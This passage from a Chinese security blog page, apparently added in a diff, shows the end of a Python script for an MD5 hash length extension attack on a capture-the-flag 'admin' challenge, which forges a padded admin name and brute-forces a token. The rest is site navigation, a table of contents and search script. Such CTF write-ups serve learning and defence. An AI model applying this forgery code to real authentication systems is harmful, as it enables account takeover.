class="hljs-string">‘do’</span>:<span class="hljs-string">‘decrypt’</span>,<span class="hljs-string">‘iv’</span>:string,<span class="hljs-string">‘text’</span>:encrypt},cookies=cookies)<br>    <span class="hljs-keyword">print</span> s.content<br>    r = re.findall(<span class="hljs-string">‘(.{32,32})&lt;br /&gt;’</span>,s.content)<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">‘’</span>.join([chr(int(<span class="hljs-string">‘0x’</span>+r[<span class="hljs-number">0</span>][i]+r[<span class="hljs-number">0</span>][i+<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,len(r[<span class="hljs-number">0</span>]),<span class="hljs-number">2</span>)])<br><br>hash_ex = <span class="hljs-string">‘e825bd41831d87fa7e8b84b5e6614ce5’</span><br>name = <span class="hljs-string">‘admin’</span>+<span class="hljs-string">‘\x80’</span>+<span class="hljs-string">‘\x00’</span><em><span class="hljs-number">40</span>+<span class="hljs-string">‘\x78’</span>+<span class="hljs-string">‘\x00’</span></em><span class="hljs-number">7</span>+<span class="hljs-string">‘tadmin’</span>+<span class="hljs-string">‘|1|’</span>+hash_ex<br><br><br>passwd = <span class="hljs-string">‘33’</span><br><span class="hljs-comment"># register(name,passwd)</span><br>rs = login(name,passwd)<br><span class="hljs-keyword">print</span> rs[<span class="hljs-string">‘sign’</span>],len(rs[<span class="hljs-string">‘token’</span>][:<span class="hljs-number">190</span>])<br><span class="hljs-comment"># print rs[‘token’][:190]</span><br>dic = []<br>s = <span class="hljs-string">‘0987654321abcdef’</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> s:<br>        dic.append(i+j)<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dic:<br>    attack(rs[<span class="hljs-string">‘token’</span>][:<span class="hljs-number">190</span>]+i,hash_ex)<br><br><span class="hljs-comment"># print token_fl</span><br>test(token_fl,hash_ex)</code></pre></div>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/WEB漏洞/" rel="tag"># WEB漏洞</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/07/02/漏洞分析之CVE-2010-2883（栈溢出）/" rel="next" title="漏洞分析之CVE-2010-2883（栈溢出）">
+                <i class="fa fa-chevron-left"></i> 漏洞分析之CVE-2010-2883（栈溢出）
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/08/14/2017合天全国高校网安联赛专题赛--赛前指导练习题web进阶篇Writeup/" rel="prev" title="2017合天全国高校网安联赛专题赛--赛前指导练习题web进阶篇Writeup">
+                2017合天全国高校网安联赛专题赛--赛前指导练习题web进阶篇Writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/qq.jpg"
+                alt="4ct10n" />
+            
+              <p class="site-author-name" itemprop="name">4ct10n</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">53</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">分类</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/actionyz" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="mailto:act01n@163.com" target="_blank" title="E-Mail">
+                    
+                      <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://www.google.com" target="_blank" title="Google">
+                    
+                      <i class="fa fa-fw fa-google"></i>Google</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="1792034533" target="_blank" title="QQ">
+                    
+                      <i class="fa fa-fw fa-QQ"></i>QQ</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://example.com/" title="Title" target="_blank">Title</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-md5加密原理"><span class="nav-number">1.</span> <span class="nav-text">0x00 MD5加密原理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x1-字节填充"><span class="nav-number">1.1.</span> <span class="nav-text">0x1 字节填充</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x2-分组加密"><span class="nav-number">1.2.</span> <span class="nav-text">0x2 分组加密</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x3-实例演示"><span class="nav-number">1.3.</span> <span class="nav-text">0x3 实例演示</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-攻击原理"><span class="nav-number">2.</span> <span class="nav-text">0x01 攻击原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-攻击脚本"><span class="nav-number">3.</span> <span class="nav-text">0x02 攻击脚本</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x1-md5-python-实现"><span class="nav-number">3.1.</span> <span class="nav-text">0x1 md5 python 实现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x2-计算脚本"><span class="nav-number">3.2.</span> <span class="nav-text">0x2 计算脚本</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-实例演示"><span class="nav-number">4.</span> <span class="nav-text">0x03 实例演示</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x1-简单实例"><span class="nav-number">4.1.</span> <span class="nav-text">0x1 简单实例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x2-jarvisoj-flag在管理员手里"><span class="nav-number">4.2.</span> <span class="nav-text">0x2 jarvisoj flag在管理员手里</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#方法一-利用hashextender"><span class="nav-number">4.2.1.</span> <span class="nav-text">方法一 利用hash_extender</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方法二-利用上述脚本"><span class="nav-number">4.2.2.</span> <span class="nav-text">方法二 利用上述脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x3-admin"><span class="nav-number">4.3.</span> <span class="nav-text">0x3 admin</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#step-1-初步审计"><span class="nav-number">4.3.1.</span> <span class="nav-text">step 1 初步审计</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#step-2-直接解密解法一"><span class="nav-number">4.3.2.</span> <span class="nav-text">step 2 直接解密(解法一)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#step-3-利用hash拓展攻击没有必要"><span class="nav-number">4.3.3.</span> <span class="nav-text">step 3 利用hash拓展攻击（没有必要）</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">4ct10n</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
